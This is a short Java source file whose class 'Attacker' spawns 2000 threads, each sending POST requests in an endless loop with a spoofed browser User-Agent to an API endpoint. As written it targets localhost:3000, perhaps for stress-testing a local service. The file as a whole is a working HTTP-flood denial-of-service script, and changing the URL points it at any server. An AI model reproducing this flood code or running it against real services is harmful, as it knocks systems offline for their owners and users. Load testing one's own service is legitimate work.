package Utils;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

public class Attacker {

    public static void main(String... args) throws Exception {
        int i = 0;
        while (i != 2000) {
            DdosThread thread = new DdosThread();
            thread.start();
            i++;
        }
    }

    public static class DdosThread extends Thread {

        private AtomicBoolean running = new AtomicBoolean(true);
        private final String request = "https://localhost:3000/api/clientName";
        private final URL url;

        String param = URLEncoder.encode("8777777", "UTF-8");

        public DdosThread() throws Exception {
            url = new URL(request);
        }


        @Override
        public void run() {
            while (running.get()) {
                try {
                    attack();
                } catch (Exception e) {
                    System.out.println("err" + e);
                }
            }
        }

        public void attack() throws Exception {
            System.out.println("attacking");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", "localhost");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
            connection.getInputStream();
        }
    }
}
